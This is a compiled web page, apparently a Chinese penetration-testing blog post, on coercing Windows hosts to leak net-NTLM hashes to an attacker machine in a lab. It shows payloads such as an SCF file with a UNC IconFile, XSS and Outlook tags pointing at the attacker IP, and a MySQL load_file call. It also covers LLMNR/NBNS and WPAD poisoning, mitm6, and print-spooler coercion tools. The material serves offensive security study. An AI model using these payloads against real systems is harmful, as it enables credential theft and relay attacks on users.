import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as n}from"./app-DS0ZCcmM.js";const t={};function l(p,i){return n(),a("div",null,i[0]||(i[0]=[e(`<h1 id="发送ntlm请求" tabindex="-1"><a class="header-anchor" href="#发送ntlm请求"><span>发送NTLM请求</span></a></h1><h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言"><span>前言</span></a></h2><p>参考windows protocol进行实际操作，尝试从服务器向攻击者发起ntlm请求。</p><p>使用工具:Responder(可能会遇到版本较低问题，需要自己更新)</p><p>可能用到的机器</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kali 192.168.30.128</span></span>
<span class="line"><span>pc 192.168.30.20</span></span>
<span class="line"><span>dc 192.168.30.10</span></span>
<span class="line"><span>win10 192.168.30.30</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="图标" tabindex="-1"><a class="header-anchor" href="#图标"><span>图标</span></a></h2><p><strong>desktop.ini</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/deskktop.png" alt="deskktop" tabindex="0" loading="lazy"><figcaption>deskktop</figcaption></figure><p>关闭推荐选项，即可看见隐藏的ini文件(看不见建议修改图标)</p><p>将该文件以记事本的方式开启，修改目标为攻击者，当用户访问该文件夹时，即可监听到net ntlm-hash</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/evil.png" alt="evil" tabindex="0" loading="lazy"><figcaption>evil</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/v2hash.png" alt="v2hash" tabindex="0" loading="lazy"><figcaption>v2hash</figcaption></figure><p><strong>SCF文件</strong></p><p>文件夹底下含有scf后缀的文件时，scf文件包含了IconFile属性，Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>[Shell]</span></span>
<span class="line"><span>Command=2</span></span>
<span class="line"><span>IconFile=\\\\192.168.30.128\\scf\\test.ico</span></span>
<span class="line"><span>[Taskbar]</span></span>
<span class="line"><span>Command=ToggleDesktop</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当用户访问含有该文件的文件夹时，攻击者能够监听到用户的net-ntlm hash</p><p><strong>用户头像</strong></p><p>适用于Windows 10/2016/2019</p><p>在更改账户图片处。</p><p>用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。</p><h2 id="系统命令携带unc路径" tabindex="-1"><a class="header-anchor" href="#系统命令携带unc路径"><span>系统命令携带UNC路径</span></a></h2><p>思路都是利用UNC路径去访问，就和protocol里面说的一样，能执行命令干什么不行呢，知道就行</p><h2 id="xss" tabindex="-1"><a class="header-anchor" href="#xss"><span>XSS</span></a></h2><p>利用XSS加载访问UNC路径</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> src</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;\\\\192.168.30.128\\xss&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/20hash.png" alt="20hash" tabindex="0" loading="lazy"><figcaption>20hash</figcaption></figure><p>当用户访问该存在xss的页面，将会UNC加载该路径，听到hash</p><p>接下来模拟使用http的情况</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> src</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;//192.168.30.128\\xss&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这种情况会弹出认证框，导致我们监听失败</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/box.png" alt="box" tabindex="0" loading="lazy"><figcaption>box</figcaption></figure><p>这是因为http协议导致的，smb协议会默认使用用户名和密码去自动登录，http协议则需要自行设置</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/xss.png" alt="xss" tabindex="0" loading="lazy"><figcaption>xss</figcaption></figure><p>选择使用当前用户名和密码自行登录后，再次访问该页面，就能监听到hash</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/listenhash.png" alt="listenhash" tabindex="0" loading="lazy"><figcaption>listenhash</figcaption></figure><p>在默认配置下，构造unc访问smb协议，仅适用与ie和edge浏览器，http协议适用于所有浏览器，但是需要修改安全策略</p><p>但是在使用http协议时，如果访问站点的域名位于内网或者是信任列表时会直接登录</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/priv.png" alt="priv" tabindex="0" loading="lazy"><figcaption>priv</figcaption></figure><p>如果认证用户有创建所有子对象这一条权限，当我们获取到一个域内认证用户时，就可以添加一条DNS记录为域名，从而获取hash</p><p>(实际测试中这一条权限不是默认开启的)</p><h2 id="outlook" tabindex="-1"><a class="header-anchor" href="#outlook"><span>outlook</span></a></h2><p>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">img</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> src</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;\\\\192.168.30.128\\outlook&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="pdf" tabindex="-1"><a class="header-anchor" href="#pdf"><span>PDF</span></a></h2><p>使用脚本将普通的pdf转化为恶意pdf文件</p><p><a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noopener noreferrer">worse-pdf</a></p><p>用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行.</p><p>详细可以看3gstudent的博客</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash" target="_blank" rel="noopener noreferrer">pdf获取net-nelm hash</a></p><h2 id="office" tabindex="-1"><a class="header-anchor" href="#office"><span>Office</span></a></h2><p>新建一个word，随便放一张图片</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/word.png" alt="word" tabindex="0" loading="lazy"><figcaption>word</figcaption></figure><p>用7zip打开</p><p>进入word_rels，修改document.xml.rels</p><p>可以看到Target参数本来是本地的路径，修改为UNC路径，然后加上<code>TargetMode=&quot;External&quot;</code></p><p>注意：似乎在较新的windows上已经没有这样的操作了，或许是我的环境有问题</p><h2 id="mysql" tabindex="-1"><a class="header-anchor" href="#mysql"><span>MySql</span></a></h2><p>利用mysql的通信外带</p><p>load_file函数支持使用unc路径加载</p><p>需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p><p>只需要</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> load_file(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;\\\\\\\\192.168.30.128\\\\mysql&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="nbns-llmnr" tabindex="-1"><a class="header-anchor" href="#nbns-llmnr"><span>NBNS&amp;LLMNR</span></a></h2><p>windows 解析域名的顺序是</p><ul><li>Hosts</li><li>DNS (cache / server)</li><li>LLMNR</li><li>NBNS</li></ul><p>如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析</p><h3 id="llmnr" tabindex="-1"><a class="header-anchor" href="#llmnr"><span>LLMNR</span></a></h3><p>LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。</p><p>LLMNR 进行名称解析的过程为：</p><ul><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有则会像当前子网域发送广播</li><li>当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败</li></ul><p>也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现。</p><p>当受害者访问一个不存在的域名</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr.png" alt="llmnr" tabindex="0" loading="lazy"><figcaption>llmnr</figcaption></figure><p>向当前子网域发送广播，此时我们可以在攻击者的机器上发送响应包，告诉受害者我们就是他访问的这个域名，不就得到了受害者的net-ntlm hash吗，同样使用responsder进行实现</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr2.png" alt="llmnr2" tabindex="0" loading="lazy"><figcaption>llmnr2</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/llmnr3.png" alt="llmnr3" tabindex="0" loading="lazy"><figcaption>llmnr3</figcaption></figure><h3 id="nbns" tabindex="-1"><a class="header-anchor" href="#nbns"><span>NBNS</span></a></h3><p>全称是NetBIOS Name Service。</p><p>NetBIOS 协议进行名称解析的过程如下：</p><ul><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求</li><li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</li><li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</li></ul><p>lmhosts 文件位于<code>C:\\Windows\\System32\\drivers\\etc\\</code>目录中。</p><p>NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在。使用Responder也可以很方便得进行测试。这里不再重复展示。</p><h2 id="wpad-mitm6" tabindex="-1"><a class="header-anchor" href="#wpad-mitm6"><span>WPAD&amp;mitm6</span></a></h2><p>wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/lan-setting.png" alt="lan-setting" tabindex="0" loading="lazy"><figcaption>lan-setting</figcaption></figure><p>默认自动检测设置是开启的。</p><p>PAC文件的格式如下</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> FindProxyForURL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">url,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> host</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">url</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;http://www.baidu.com/&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DIRECT&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">host</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;twitter.com&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SOCKS 127.0.0.10:7070&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">dnsResolve(host</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;10.0.0.100&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) return </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;PROXY 127.0.0.1:8086;DIRECT&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DIRECT&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>WPAD一般请求流程为</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/t019d8c1f08fefc8c39.png" alt="t019d8c1f08fefc8c39" tabindex="0" loading="lazy"><figcaption>t019d8c1f08fefc8c39</figcaption></figure><p>用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。</p><p>查询PAC文件的顺序如下：</p><ol><li>通过DHCP服务器</li><li>查询WPAD主机的IP <ul><li>Hosts</li><li>DNS (cache / server)</li><li>LLMNR</li><li>NBNS</li></ul></li></ol><h3 id="配合llmnr-nbns投毒" tabindex="-1"><a class="header-anchor" href="#配合llmnr-nbns投毒"><span>配合LLMNR/NBNS投毒</span></a></h3><p>用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD/wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/dnc-llmnr.png" alt="dnc-llmnr" tabindex="0" loading="lazy"><figcaption>dnc-llmnr</figcaption></figure><p>受害者访问WPAD/wpad.dat，Responder就能获取到用户的net-ntlm hash(这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上<code>-F</code> 开启)</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/isa.png" alt="isa" tabindex="0" loading="lazy"><figcaption>isa</figcaption></figure><p>然后Responder通过伪造如下pac文件将代理指向 ISAProxySrv:3141</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">function </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">FindProxyForURL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(url, host){</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ((host </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;localhost&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">      ||</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> shExpMatch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(host, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;localhost.*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">      ||</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(host </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;127.0.0.1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">      ||</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> isPlainHostName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(host)) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;DIRECT&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">dnsDomainIs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(host, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;RespProxySrv&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">      ||</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">shExpMatch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(host, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;(*.RespProxySrv|RespProxySrv)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)) </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">                return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;DIRECT&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;PROXY ISAProxySrv:3141; DIRECT&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>受害者会使用ISAProxySrv:3141作为代理，但是受害者不知道ISAProxySrv对应的ip是什么，所以会再次查询，Responder再次通过llmnr投毒进行欺骗。将ISAProxySrv指向Responder本身。然后开始中间人攻击。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等，Responder都支持。</p><p>微软添加的保护措施让这种较老的攻击手法失效</p><p>1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。</p><p>2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询</p><h3 id="配合dhcpv6" tabindex="-1"><a class="header-anchor" href="#配合dhcpv6"><span>配合DHCPv6</span></a></h3><p>微软新增了两个措施，对应的有两个绕过方法。</p><p><strong>措施2</strong></p><p>第二个措施比较好绕过，毕竟responder也没有要求在下载PAC文件时获取hash，需要开F强制开启</p><p>给用户返回一个正常的wpad。将代理指向我们自己，当受害主机连接到我们的“代理”服务器时，我们可以通过HTTP CONNECT动作、或者GET请求所对应的完整URI路径来识别这个过程，然后回复HTTP 407错误（需要代理身份验证），这与401不同，IE/Edge以及Chrome浏览器（使用的是IE设置）会自动与代理服务器进行身份认证，即使在最新版本的Windows系统上也是如此。在Firefox中，用户可以配置这个选项，该选项默认处于启用状态。</p><p><strong>措施1</strong></p><p>系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP选项或DNS协议完成该任务。</p><p>在<a href="https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016" target="_blank" rel="noopener noreferrer">MS16-077</a>之后，通过DHCP和DNS协议还可以获取到pac文件。</p><p>DHCP和DNS都有指定的服务器，不是通过广播包，而且dhcp服务器和dns服务器我们是不可控的，没法进行投毒。</p><p>利用ipv6优先级高于ipv4，这里用到DHCPV6协议。</p><p>DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址[ff02::1:2]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。DHCPv6四步交互过程，</p><blockquote><p>客户端向[ff02::1:2]组播地址发送一个Solicit请求报文，</p></blockquote><blockquote><p>DHCP服务器或中继代理回应Advertise消息告知客户端。</p></blockquote><blockquote><p>客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息，</p></blockquote><blockquote><p>最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息。</p></blockquote><p>通俗点来说就是，在可以使用ipv6的情况(Windows Vista以后默认开启),攻击者能接收到其他机器的dhcpv6组播包的情况下，攻击者最后可以让受害者的DNS设置为攻击者的IPv6地址。</p><p>工具:<a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noopener noreferrer">mitm6</a></p><p>mitm6首先侦听攻击者计算机的某个网卡上的DHCPV6流量。当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置mitm6将回复这些DHCPv6请求，并在链接本地范围内为受害者分配一个IPv6地址。</p><p>尽管在实际的IPv6网络中，这些地址是由主机自己自动分配的，不需要由DHCP服务器配置，但这使我们有机会将攻击者IP设置为受害者的默认IPv6 DNS服务器。</p><p><strong>注意：只适用于windows</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/12345.png" alt="12345" tabindex="0" loading="lazy"><figcaption>12345</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/1234566.png" alt="1234566" tabindex="0" loading="lazy"><figcaption>1234566</figcaption></figure><p>目标机器的DNS服务器的地址已经换为了攻击者的机器</p><h2 id="xxe-ssrf" tabindex="-1"><a class="header-anchor" href="#xxe-ssrf"><span>XXE &amp;&amp; SSRF</span></a></h2><p>XXE和ssrf的利用思路和前面无二，基本都是unc路径或者是http路径加载</p><p>在xxe和ssrf测试中一般要测试这两个方面</p><ol><li>支不支持UNC路径，比如<code>\\\\ip\\x</code>或者<code>file://ip/x</code></li><li>支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的</li></ol><h2 id="打印机错误" tabindex="-1"><a class="header-anchor" href="#打印机错误"><span>打印机错误</span></a></h2><p>比较常用的一个漏洞</p><p>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p><p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。</p><p>通过脚本，我们可以让目标机器强制回连</p><p><a href="https://github.com/topotam/PetitPotam" target="_blank" rel="noopener noreferrer">PetitPotem</a></p><p>由于机器版本问题，使用printerbug很可能出问题(函数调用问题)，ice师傅推荐了下面这个工具，函数fuzz测试，比较好用</p><p><a href="https://github.com/p0dalirius/Coercer" target="_blank" rel="noopener noreferrer">Coercer</a></p>`,141)]))}const o=s(t,[["render",l],["__file","发送NTLM请求.html.vue"]]),d=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/NTLM%E4%B8%93%E9%A2%98/%E5%8F%91%E9%80%81NTLM%E8%AF%B7%E6%B1%82.html","title":"发送NTLM请求","lang":"zh-CN","frontmatter":{"description":"发送NTLM请求 前言 参考windows protocol进行实际操作，尝试从服务器向攻击者发起ntlm请求。 使用工具:Responder(可能会遇到版本较低问题，需要自己更新) 可能用到的机器 图标 desktop.ini deskktopdeskktop 关闭推荐选项，即可看见隐藏的ini文件(看不见建议修改图标) 将该文件以记事本的方式开启，...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/NTLM%E4%B8%93%E9%A2%98/%E5%8F%91%E9%80%81NTLM%E8%AF%B7%E6%B1%82.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"发送NTLM请求"}],["meta",{"property":"og:description","content":"发送NTLM请求 前言 参考windows protocol进行实际操作，尝试从服务器向攻击者发起ntlm请求。 使用工具:Responder(可能会遇到版本较低问题，需要自己更新) 可能用到的机器 图标 desktop.ini deskktopdeskktop 关闭推荐选项，即可看见隐藏的ini文件(看不见建议修改图标) 